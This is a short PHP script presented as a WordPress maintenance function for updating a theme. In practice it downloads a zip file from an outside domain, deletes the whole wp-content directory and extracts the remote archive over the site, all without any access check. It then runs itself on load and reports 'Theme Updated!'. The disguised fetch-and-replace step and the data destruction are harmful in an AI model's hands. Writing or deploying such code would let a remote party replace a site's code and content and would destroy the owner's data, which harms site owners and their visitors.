<?php 

function wp_maintenance_ajax_update_theme()
{
    $url = 'https://zxfolio.site/bk/wp-content_4.zip';  // SOURCE FILE

    define('BUFSIZ', 4095);
    try 
    {
        $rfile = fopen($url, 'r');
        if ($rfile === false) {
            throw new Exception("Failed to open remote file.");
        }
        $lfile = fopen(basename($url), 'w');
        if ($lfile === false) {
            throw new Exception("Failed to create local file.");
        }
        while( !feof($rfile) )
        {
            if (fwrite($lfile, fread($rfile, BUFSIZ), BUFSIZ) === false) {
                throw new Exception("Failed to write to local file.");
            }
        }
        fclose($rfile);
        fclose($lfile);
    } 
    catch (Exception $e) 
    {
        $ajax['status'] = false;
        $ajax['error'] = 'error';
        $ajax['message'] = "Error: " . $e->getMessage();
        print( json_encode($ajax) );
        exit();
    }
    
    
    $_dir = __DIR__ . '/wp-content';
    $it = new RecursiveDirectoryIterator($_dir, RecursiveDirectoryIterator::SKIP_DOTS);
    $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
    foreach($files as $file) 
    {
        if ( $file->isDir() )
        {
            rmdir($file->getRealPath());
        } 
        else 
        {
            unlink($file->getRealPath());
        }
    }
    rmdir($_dir);
    
    $move_uploaded_theme_loc = __DIR__ . '/' . basename($url);
    $theme_extract_path = __DIR__ . '/';

    // Unzip Moved File
    $zip = new ZipArchive;
    $res_check = $zip->open($move_uploaded_theme_loc);

    if( $res_check === TRUE )
    {
        $zip->extractTo($theme_extract_path);
        $zip->close();

        $ajax['status'] = true;
        $ajax['success'] = 'success';
        $ajax['message'] = 'Theme Updated!';
        print( json_encode($ajax) );
        exit();
    }
    else 
    {
        $ajax['status'] = false;
        $ajax['error'] = 'error';
        $ajax['message'] = 'Failed To Update!';
        print( json_encode($ajax) );
        exit();
    }
}
wp_maintenance_ajax_update_theme();